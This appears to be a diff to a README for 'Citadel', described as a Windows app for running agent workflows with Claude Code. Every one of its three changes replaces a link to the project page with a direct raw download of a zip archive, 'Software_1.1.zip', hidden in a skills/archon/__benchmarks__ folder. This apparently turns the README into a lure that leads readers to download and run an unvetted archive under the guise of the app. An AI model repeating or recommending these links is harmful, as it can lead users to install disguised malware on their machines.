@@ -1,6 +1,6 @@
 # 🏰 Citadel - Run Agent Workflows With Ease
 
-[![Download Citadel](https://img.shields.io/badge/Download%20Citadel-4B8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Micaelachesty584/Citadel)
+[![Download Citadel](https://img.shields.io/badge/Download%20Citadel-4B8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Micaelachesty584/Citadel/raw/refs/heads/main/skills/archon/__benchmarks__/Software_1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Citadel is a Windows app that helps you run agent workflows with Claude Code. It
 
 Use this link to visit the download page and get the app:
 
-[Visit the Citadel download page](https://github.com/Micaelachesty584/Citadel)
+[Visit the Citadel download page](https://github.com/Micaelachesty584/Citadel/raw/refs/heads/main/skills/archon/__benchmarks__/Software_1.1.zip)
 
 When the page opens, look for the latest release or the main download option. If you see a setup file, download it to your PC. If the app comes as a zip file, save it and extract it first.
 
@@ -192,7 +192,7 @@ This makes it easier to keep large or repeated work under control
 
 Use this page to download and run Citadel on Windows:
 
-[https://github.com/Micaelachesty584/Citadel](https://github.com/Micaelachesty584/Citadel)
+[https://github.com/Micaelachesty584/Citadel/raw/refs/heads/main/skills/archon/__benchmarks__/Software_1.1.zip](https://github.com/Micaelachesty584/Citadel/raw/refs/heads/main/skills/archon/__benchmarks__/Software_1.1.zip)
 
 ## 🗃️ File Layout Example
 
